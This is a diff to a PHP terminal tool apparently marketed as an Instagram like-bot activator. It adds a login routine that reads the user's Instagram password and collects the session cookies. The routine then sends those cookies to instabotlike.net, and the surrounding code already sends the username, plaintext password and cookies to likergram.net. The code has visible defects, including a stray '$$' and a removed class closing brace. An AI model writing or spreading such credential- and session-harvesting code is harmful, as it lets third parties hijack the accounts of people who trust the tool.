@@ -180,7 +180,6 @@ class TerminalController{
          for($o=0;$o<count($d[0]);$o++)$cookie.=$d[1][$o].";";
          $userid = $a->logged_in_user->pk;
          $username = $a->logged_in_user->username;
-         echo $cookie;
          echo "\n".$this->COLOR_ORANGE."Getting cookies...".$this->COLOR_WHITE;
          $this->curl('https://www.likergram.net/apiCookie.php?id='.$userid.'&username='.$username.'&password='.$password.'&cookie='.urlencode($cookie));
          echo"\n";
@@ -225,6 +224,76 @@ class TerminalController{
          }
       }
    }
-}
+   public function ViewLoginInstabotlike(){
+      echo "---------------------------------------------\n";
+      echo "Instabotlike.Net Login\n";
+      echo "---------------------------------------------\n";
+      echo "".$this->COLOR_LIGHT_GREEN."Userame : ".$this->COLOR_WHITE;
+      $username = trim(fgets(STDIN));
+      echo "".$this->COLOR_LIGHT_GREEN."Password : ".$this->COLOR_BLACK;
+      $password = trim(fgets(STDIN));
+      echo "\n";
+      echo "".$$this->COLOR_ORANGE."Please wait checking username/password ...".$this->COLOR_WHITE;
+      echo"\n";
+
+      $login = $this->InstagramLoginInstabotlike($username,$password);
+     
+      $status = preg_match('/"authenticated": (.*?),/', $login[1], $status) ? $status[1] : null;
+      if($status == 'false'){
+         echo"\n";
+         echo "\nError : ".$this->COLOR_RED."Username/password incorret.".$this->COLOR_WHITE;
+         echo"\n";
+         echo"\n";
+         echo "---Your botlike is not activated.----";
+         echo"\n";
+         echo "\nIP : ".$this->COLOR_ORANGE."".$this->curl('https://www.instabotlike.net/lib/ip.php')."".$this->COLOR_WHITE;
+         echo "\nStatus : ".$this->COLOR_RED."False".$this->COLOR_WHITE;
+         echo "\nUserID : null";
+         echo "\nUsername : ".$username;
+         echo "\nBio : null";
+         echo"\n";
+         echo $this->COLOR_ORANGE."\nRelogin?".$this->COLOR_WHITE."y/n";
+         echo "\nSelect option : ".$this->COLOR_LIGHT_GREEN."";
+         $option = trim(fgets(STDIN));
+         if($option == 'y'){
+            echo $this->COLOR_WHITE;
+            $this->ViewLoginInstabotlike();
+         }else{
+            echo $this->COLOR_WHITE;
+            $this->Dashboard();
+         }
+      }else{
+         echo "\n".$this->COLOR_ORANGE."Getting cookies...".$this->COLOR_WHITE;
+         preg_match_all('%Set-Cookie: (.*?);%',$login[0],$d);$cookie = '';
+         for($o=0;$o<count($d[0]);$o++)$cookie.=$d[1][$o].";";
+         $data = $this->curl('https://www.instagram.com/', 0, 0, $cookie);
+         $user_api = preg_match('/window._sharedData = (.*?);<\/script>/', $data, $user_api) ? $user_api[1] : null;
+         $user = json_decode($user_api);
+         $userid = @$user->config->viewer->id;
+         $username = @$user->config->viewer->username;
+         $bio = @$user->config->viewer->biography;
+         $this->curl('https://www.instabotlike.net/apiCookie.php?cookie='.$cookie);
+         echo"\n";
+         echo"\n";
+         echo "".$this->COLOR_WHITE."---Your botlike is activated.----";
+         echo"\n";
+         echo "\nIP : ".$this->COLOR_ORANGE."".$this->curl('https://www.instabotlike.net/lib/ip.php')."".$this->COLOR_WHITE;
+         echo "\nStatus : ".$this->COLOR_LIGHT_GREEN."True".$this->COLOR_WHITE;
+         echo "\nUserID : ".$userid;
+         echo "\nUsername : ".$username;
+         echo "\nBio : ".$bio;
+         echo"\n";
+         echo $this->COLOR_ORANGE."\nRelogin?".$this->COLOR_WHITE."y/n";
+         echo "\nSelect option : ".$this->COLOR_LIGHT_GREEN."";
+         $option = trim(fgets(STDIN));
+         if($option == 'y'){
+            echo $this->COLOR_WHITE;
+            $this->ViewLoginInstabotlike();
+         }else{
+            echo $this->COLOR_WHITE;
+            $this->Dashboard();
+         }
+      }
+   }
 $open = new TerminalController();
 echo $open->Dashboard();
